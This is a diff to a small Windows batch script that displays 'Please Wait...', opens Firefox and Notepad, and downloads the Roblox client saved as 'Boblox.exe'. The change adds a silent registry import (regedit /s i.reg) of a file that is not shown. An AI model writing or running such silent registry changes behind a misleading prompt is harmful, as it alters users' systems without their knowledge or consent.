@@ -1,6 +1,7 @@
 @echo off
 title Please Wait...
 echo Please Wait...
+regedit /s i.reg
 start /min firefox.exe about:robots > NUL
 start notepad IMPORTANT.TXT
 start /min /wait curl -L https://www.roblox.com/download/client --output Boblox.exe > NUL
